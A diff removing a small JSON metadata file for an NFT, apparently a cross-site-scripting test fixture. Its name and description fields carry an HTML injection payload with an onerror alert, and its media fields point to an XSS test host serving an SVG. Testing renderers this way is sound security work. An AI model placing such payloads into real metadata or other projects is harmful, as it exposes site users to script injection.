@@ -1,8 +1,0 @@
-{
-  "name": "\"><image src=x onerror=alert(1)> <b>#0</b>",
-  "description": "\"><image src=x onerror=alert(1)> <b>Deskripsi 0</b>",
-  "image": "https://tesxss.vercel.app/xss.svg",
-  "video": "https://tesxss.vercel.app/?video=/nft/0/video.mp4",
-  "content_url": "https://tesxss.vercel.app/?content=/nft/0/video.mp4",
-  "attributes": []
-}
